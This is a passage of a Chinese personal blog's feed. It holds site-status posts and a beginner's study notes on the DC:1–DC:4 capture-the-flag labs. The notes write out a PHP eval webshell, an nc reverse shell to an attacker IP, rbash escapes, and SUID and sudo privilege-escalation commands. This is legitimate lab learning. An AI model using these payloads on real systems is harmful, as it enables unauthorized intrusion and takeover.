    <content type="html"><![CDATA[<h1 id="号外"><a href="#号外" class="headerlink" title="号外!"></a>号外!</h1><p>因为<code>vercel</code>喜提被墙，我站的<code>网易云</code>和<code>twikoo(评论系统)</code>当场中枪，直接瘫了（战术去世.jpg），现在大家只能将就，<del>或者使用尊贵的来必力</del>，对此产生的不便，请您理解。</p><p><img src="/posts/9dca6c72/image_68.png"></p><p>尊贵的<code>leancould的服务器域名</code>在大陆被403，需要绑定自己的域名才行，所以，和您想的一样，<strong>artitalk</strong>也炸了（战术去世.jpg）</p><p>预期的解决办法：想找用vercel反代。</p><p><strong>吾站之存未期逾月，vercel为墙之，github为阻之，leancould亦拒访于我于我，噫！如此之行，是何异于刺人而杀之也！</strong></p><hr><h1 id="新博文前瞻"><a href="#新博文前瞻" class="headerlink" title="新博文前瞻"></a>新博文前瞻</h1><p><em>这段其实已经在空间发过一个月了（逃）</em></p><p>由于vercel被墙，所以她就被鸽了</p><p>vue-netease-music是一个基于Vue2、Vue-CLI3的高仿网易云mac客户端播放器（PC） 。美观、简洁是她最好的代名词</p><p>效果：<code>顶栏 - 娱乐 - 音乐</code></p><p>宣传图：</p><p><img src="/posts/9dca6c72/psc.png"></p><p><img src="/posts/9dca6c72/psc1.png"></p><p><img src="/posts/9dca6c72/psc2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;号外&quot;&gt;&lt;a href=&quot;#号外&quot; class=&quot;headerlink&quot; title=&quot;号外!&quot;&gt;&lt;/a&gt;号外!&lt;/h1&gt;&lt;p&gt;因为&lt;code&gt;vercel&lt;/code&gt;喜提被墙，我站的&lt;code&gt;网易云&lt;/code&gt;和&lt;code&gt;twikoo(评论系统)&lt;/co</summary>
      
    
    
    
    <category term="管理日志" scheme="https://meinming.github.io/categories/%E7%AE%A1%E7%90%86%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="管理日志" scheme="https://meinming.github.io/tags/%E7%AE%A1%E7%90%86%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>公告：本站即日起开始使用来必力评论系统</title>
    <link href="https://meinming.github.io/posts/8338140e/"/>
    <id>https://meinming.github.io/posts/8338140e/</id>
    <published>2022-08-13T07:22:04.000Z</published>
    <updated>2022-09-02T01:24:01.390Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/posts/8338140e/laibili.png" alt="本站即日起开始使用来必力评论系统"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/posts/8338140e/laibili.png&quot; alt=&quot;本站即日起开始使用来必力评论系统&quot;&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="管理日志" scheme="https://meinming.github.io/categories/%E7%AE%A1%E7%90%86%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="管理日志" scheme="https://meinming.github.io/tags/%E7%AE%A1%E7%90%86%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>DC:1~DC:4知识点总结（学习笔记）</title>
    <link href="https://meinming.github.io/posts/91ea5378/"/>
    <id>https://meinming.github.io/posts/91ea5378/</id>
    <published>2022-08-12T01:24:47.000Z</published>
    <updated>2022-09-01T01:15:47.000Z</updated>
    
    <content type="html"><![CDATA[<p><em><strong>前言：因为暑假在家放假，补课之后想找找点有趣的事情去做，就想起来虚拟机里吃灰的Kali，赶忙挖出来嗮嗮。做完了DC:1~DC:4的ctf（其实Ta是抄的），初步理解了基本的过程，现在写一篇学习笔记记录一下。</strong></em></p><p><em>注意：本文是DC:1~DC:4的知识点总和，目的是启发、引导初学者在学习ctf中<strong>建立</strong>这样一个基本的<strong>思路</strong>，具有一定的<strong>片面性</strong>，请在学习的过程中<strong>批判性地阅读</strong>，<strong>发散思维</strong>，由于<strong>经验不足</strong>，出现错误<strong>大佬轻喷</strong>。</em></p><p>DC:1~DC:4的ctf中，最终的flag都在<code>/root</code>目录中（即：root用户的家目录），所以我们必须得到<code>root账户</code>或者<code>具有管理员权限的账户</code>。故渗透的基本过程为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> 信息收集 ==&gt; 找到突破点 ==&gt; GetShell ==&gt; 本地提权</span><br></pre></td></tr></table></figure><p>我们的内容将通过此展开，以这个顺序开始叙述</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>这个步骤不可或缺，<strong>人走夜路都是要点灯的，摸黑走可是走不长远。</strong></p><h2 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h2><p>扫描目标机存活端口，可以使用（用法有很多，详细请百度）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT &lt;ip&gt;   <span class="comment">#TCP连接扫描，不安全，慢</span></span><br></pre></td></tr></table></figure><p>由于在检测每个端口时都需要进行三次握手，所以<strong>速度较慢</strong>，同时由于需要建立连接，可能会被目标主机记录下来，所以<strong>安全性不高</strong>。</p><p><code>注意：不要对未授权的主机使用，切记！！！这里由于是打靶用所以就随意了。</code></p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>这里使用dirmap(当然，用啥都行)，用法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirmap -i &lt;url&gt; -lcf   <span class="comment">#扫描目录</span></span><br></pre></td></tr></table></figure><p>这里真的<strong>很重要</strong>！！！我在打Infosec Prep:OSCP的靶机的时候，下意识直接<code>cewl</code>和<code>wpscan</code>开始爆破，但显而易见肯定不会成功，如果开始就目录扫描就可以看到<code>robots.txt</code>和<code>secret.txt</code>，<code>secret.txt</code>的 <strong>base64解码</strong> 就是靶机的<strong>SSH私钥</strong>(转换完看到<code>BEGIN OPENSSH PRIVATE KEY</code>我直接就不会了，中大奖属于是)</p><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>这个大佬们已经练成看家本领了，稍微看一下就看个大概，这里由于本人很菜，所以使用了第三方的插件脚本，可以随意发挥。我是用的是<code>Wappalyzer</code></p><p><img src="/posts/91ea5378/Wappalyzer.png"></p><p><strong>这里如果有搭建的框架了，可以直接<a href="#%E6%89%BE%E5%88%B0%E7%AA%81%E7%A0%B4%E7%82%B9/%E5%B7%B2%E7%9F%A5%E6%90%AD%E5%BB%BA%E7%9A%84%E6%A1%86%E6%9E%B6">Baidu已知漏洞</a></strong></p><p>哈也没有，继续<a href="#%E6%89%BE%E5%88%B0%E7%AA%81%E7%A0%B4%E7%82%B9/%E6%9C%AA%E7%9F%A5%E6%A1%86%E6%9E%B6">RushB</a></p><h1 id="找到突破点"><a href="#找到突破点" class="headerlink" title="找到突破点"></a>找到突破点</h1><h2 id="已知搭建的框架"><a href="#已知搭建的框架" class="headerlink" title="已知搭建的框架"></a>已知搭建的框架</h2><p>好的开端，这意味着可能有一大堆<code>Nday</code>等着给你用。</p><h3 id="使用现成的scan工具"><a href="#使用现成的scan工具" class="headerlink" title="使用现成的scan工具"></a>使用现成的scan工具</h3><p>如果你知道了目标机网站的框架，并且框架很知名，你就可以试着搜索一下Ta是否存在对应的scan工具。</p><p>你可以百度<code>&lt;目标机网站的框架&gt; 扫描</code></p><p><img src="/posts/91ea5378/joomla_scan.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">WordPress ==&gt;  WPScan //在DC-1有出现</span><br><span class="line">joomla ==&gt; JoomScan //在DC-3有出现</span><br></pre></td></tr></table></figure><h3 id="使用Msf和searchsploit中搜索"><a href="#使用Msf和searchsploit中搜索" class="headerlink" title="使用Msf和searchsploit中搜索"></a>使用Msf和searchsploit中搜索</h3><p>如果有可能的话，你可能在Msf找到相应的模块或者在 ExploitDB中找到对应漏洞</p><p>例如，在DC-1中你可以通过两种方法进入网站后台得到flag3：</p><p>    -  利用drupal CVE2014-3704漏洞直接添加管理员账号</p><p>    -  使用Msf 模块攻击GetShell后，在在配置文件中得到sql账户密码，利用scripts/password-hash.sh输出的密码覆盖掉管理员的密码</p><p>（虽然使用Msf 模块攻击GetShell是<strong>必须</strong>的，但通过两种方法得到了网站后台，所以多做些工作，也许会得到意外的结果捏！）</p><h3 id="Baidu存在的漏洞"><a href="#Baidu存在的漏洞" class="headerlink" title="Baidu存在的漏洞"></a>Baidu存在的漏洞</h3><p>其实这种方法对于系统内核也适用，后面的<code>本地提权</code>也会用到。</p><p>你可以百度搜索<code>&lt;你的目标机框架&gt; 漏洞</code>，例如：</p><p><img src="/posts/91ea5378/joomla_loudong.png"></p><p>这里是打DC:3时的，应该使用的是 CVE-2017-8917，需要用sqlmap注入数据库得到emails,username,password(这里的密码是加密的，需要使用<code>jhon</code>爆破一下)，然后登陆</p><p>虽然 CVE-2021-23132 并未使用，但后半段的改代码远程执行还是有点启示性的(其实最后看别人解的时候远程执行的部分是<strong>基本一致</strong>的 逃)</p><h2 id="未知框架"><a href="#未知框架" class="headerlink" title="未知框架"></a>未知框架</h2><p>回想一下数据收集中有没有可疑的<code>端口</code>开放或者什么可疑的<code>文件夹</code>(请仔细检查是否含有<code>secret.txt</code> <strong>战术去世</strong>)，如果有登录页面就可以尝试<strong>爆破</strong>一下。注意<code>url</code>中是否含有可能的文件包含漏洞(如果你发现类似<code>xxx.php?p=1</code>)，检查操作数据库的功能是否可以<code>注入</code>，抓取网站的数据包也许也会有意外的收获</p><p>总之，有什么方法尽管使，相信你自己！</p><h1 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h1><h2 id="使用PHP一句话"><a href="#使用PHP一句话" class="headerlink" title="使用PHP一句话"></a>使用PHP一句话</h2><p>书接上回，打DC:3时，我们在后台可以编辑blog的主题文件(typecho也有类似的功能)，我们可以在里面加个一句话：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pwned&#x27;</span>]);   <span class="comment">//这里的pwned可以换成别的，是连接的密码</span></span><br></pre></td></tr></table></figure><p>得到主题文件中木马的真实地址</p><p>以DC:3的joomla的beez为例，我把木马加在了<code>error.php</code>里面，则木马的地址为<code>&lt;网站&gt;/templates/beez3/error.php</code></p><p>连接蚁剑：</p><p><img src="/posts/91ea5378/yijuhua.png"></p><h2 id="使用反弹shell"><a href="#使用反弹shell" class="headerlink" title="使用反弹shell"></a>使用反弹shell</h2><p>方法有很多，这里以DC:4中使用的nc(netcat)演示：</p><p>先在攻击机如下配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp &lt;port&gt;   <span class="comment">#port 为攻击机端口号，并且此端口号没有被占用</span></span><br></pre></td></tr></table></figure><p>在靶机执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash &lt;攻击主机ip&gt; &lt;port&gt;</span><br></pre></td></tr></table></figure><p>这里可以反弹shell的程序有很多，大家自行百度</p><h1 id="终端提升"><a href="#终端提升" class="headerlink" title="终端提升"></a>终端提升</h1><h2 id="WebShell-gt-交互终端"><a href="#WebShell-gt-交互终端" class="headerlink" title="WebShell ==&gt; 交互终端"></a>WebShell ==&gt; 交互终端</h2><p>当你Get到一个Webshell的时候，你一定会第一时间考虑把她升级为<strong>交互终端</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Rbash的绕过"><a href="#Rbash的绕过" class="headerlink" title="Rbash的绕过"></a>Rbash的绕过</h2><p>这里在DC:2中有很多的博主使用了如下的方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/bash;    <span class="comment"># ^| 这两个步骤是在调用 /bin/bash解释器</span></span><br><span class="line">a                          <span class="comment"># _| (我这个方括号打的是不是很灵性 逃)</span></span><br><span class="line">/bin/bash    <span class="comment">#使用bash解释器</span></span><br></pre></td></tr></table></figure><p>也可以使用<code>vi</code>等绕过，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi raoguo  <span class="comment">#文件名随意</span></span><br><span class="line">esc后输入 :<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">回车后输入 :shell</span><br></pre></td></tr></table></figure><p>这里可以用来绕过的方法有很多，大家自行探(bai)索(du)吧！</p><h1 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h1><h2 id="使用suid提权"><a href="#使用suid提权" class="headerlink" title="使用suid提权"></a>使用suid提权</h2><p>SUID提权由来已久，是一种非常古老的提权方式，但生命力经久不衰（笑）</p><p>我们可以通过以下命令在<code>/</code>下找到属主为root的具有SUID权限的二进制可执行文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>DC:1的靶机中用到了<code>find</code>来提权，使用如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> 123.txt</span><br><span class="line">find 123.txt -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br></pre></td></tr></table></figure><p>更多的方式可以到<a href="https://gtfobins.github.io/">GTFOBins</a>去查下(虽然个人认为给出的方法有点复杂)</p><p>也可以百度<code>&lt;你的命令&gt; suid</code></p><h2 id="使用sudoer提权"><a href="#使用sudoer提权" class="headerlink" title="使用sudoer提权"></a>使用sudoer提权</h2><p>使用<code>sudo -l</code>查询你可以用<code>sudo</code>的命令，当你的输出结果中含有<code>NOPASSWD</code>的命令将代表你使用这个命令的sudo时，她将不需要密码</p><p>如在DC:2中，<code>git</code>小姐就有幸进入了这个队列，我们就用她来搞些事情：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git <span class="built_in">help</span> config</span><br><span class="line">    !/bin/bash或者！<span class="string">&#x27;sh&#x27;</span>完成提权</span><br></pre></td></tr></table></figure><h2 id="使用内核漏洞提权"><a href="#使用内核漏洞提权" class="headerlink" title="使用内核漏洞提权"></a>使用内核漏洞提权</h2><p>在dc-3中，得到<code>www-data</code>账户后，需要使用 CVE-2017-16995(拒绝服务漏洞)来提权，在本地使用exploitdb提供的 <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">提权脚本</a>，具体内容请自行百度</p><p><del>我自己试了好几个脚本，但编译之后总会报错，我试了3回啊3回（恼）</del></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>感谢你完整地读完了这篇文章，本文完成用时3天(指所有的业余时间)，希望同志继续努力，在这条<del>快乐</del>的道路上继续前进，也欢迎参观我的<a href="https://meinming.github.io/">博客</a>，我们有缘再见！</p><p>快乐的暑假，从渗透开始！</p><p>本文于2022年8月13号13:56完结</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;&lt;strong&gt;前言：因为暑假在家放假，补课之后想找找点有趣的事情去做，就想起来虚拟机里吃灰的Kali，赶忙挖出来嗮嗮。做完了DC:1~DC:4的ctf（其实Ta是抄的），初步理解了基本的过程，现在写一篇学习笔记记录一下。&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://meinming.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="学习笔记" scheme="https://meinming.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="渗透测试" scheme="https://meinming.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://meinming.github.io/posts/4a17b156/"/>
    <id>https://meinming.github.io/posts/4a17b156/</id>
    <published>2022-06-26T11:41:32.840Z</published>
    <updated>2022-09-01T08:48:27.946Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
